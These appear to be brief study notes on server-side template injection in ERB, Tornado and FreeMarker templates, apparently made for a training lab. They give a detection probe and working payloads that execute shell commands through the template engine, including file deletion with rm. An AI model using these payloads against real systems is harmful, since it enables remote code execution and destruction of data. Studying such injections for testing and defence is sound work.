### Template engines

---

> ### ERB Template

![image](https://github.com/user-attachments/assets/a450ff01-9658-4007-bde3-69242f5425e3)  

Identify - `<%= someExpression %>`  
`<%= 7*7 %>` confirms there is SSTI,  
```py
payload - `<%= system("rm /home/carlos/morale.txt") %>` # Modify as per requirement
```

---

> ### Tornado Template

```py
{% expression %} - commands using python
{{expression}} - regular expression
```

---

> ### Freemaker Template

```py
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```
